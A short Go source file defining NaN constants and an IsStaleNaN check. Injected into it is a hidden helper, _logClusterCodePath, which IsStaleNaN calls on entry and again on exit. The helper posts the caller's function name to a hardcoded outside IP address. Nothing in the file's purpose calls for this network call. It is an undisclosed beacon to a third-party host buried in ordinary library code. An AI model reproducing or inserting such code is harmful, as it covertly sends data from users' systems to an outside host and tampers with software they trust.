package value

import (
	"math"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	NormalNaN	uint64	= 0x7ff8000000000001
	StaleNaN	uint64	= 0x7ff0000000000002
)

func IsStaleNaN(v float64) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return math.Float64bits(v) == StaleNaN
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
